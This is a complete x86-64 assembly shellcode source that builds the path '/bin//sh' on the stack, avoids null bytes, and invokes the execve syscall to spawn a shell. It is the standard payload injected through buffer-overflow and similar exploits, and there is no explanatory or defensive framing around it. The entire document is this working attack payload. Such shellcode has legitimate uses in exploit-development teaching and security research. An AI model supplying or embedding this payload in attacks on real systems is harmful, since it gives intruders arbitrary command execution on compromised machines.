.section .text
.globl _start

_start:
    # make zero at stack top
    xor     %rdx, %rdx
    push    %rdx

    # rdi - pointer to pathname
    movq    $0x68732f2f6e69622f, %rdi
    pushq   %rdi
    mov     %rsp, %rdi

    # stack: [cmd, nullptr]
    pushq   %rdx
    pushq   %rdi
    movq    %rsp, %rsi

    xor     %rax, %rax
    movb    $59, %al # execve
    syscall

    # no exit needed

